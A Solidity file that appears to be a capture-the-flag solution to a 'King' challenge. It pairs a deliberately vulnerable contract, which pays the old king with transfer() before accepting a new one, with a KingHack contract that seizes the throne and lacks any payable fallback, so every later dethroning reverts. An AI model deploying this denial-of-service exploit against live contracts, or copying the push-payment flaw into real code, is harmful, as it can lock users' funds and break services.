// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// KingHack without fallback will deny transfer method

interface IKing {
    function prize() external view returns (uint256);

    function _king() external view returns (address);
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingHack {
    address owner;

    constructor(address payable _target) payable {
        owner = msg.sender;
        uint256 prize = IKing(_target).prize();
        (bool ok, ) = _target.call{value: prize}("");
        require(ok, "call failed");
    }

    function withdraw() external {
        require(owner == msg.sender, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
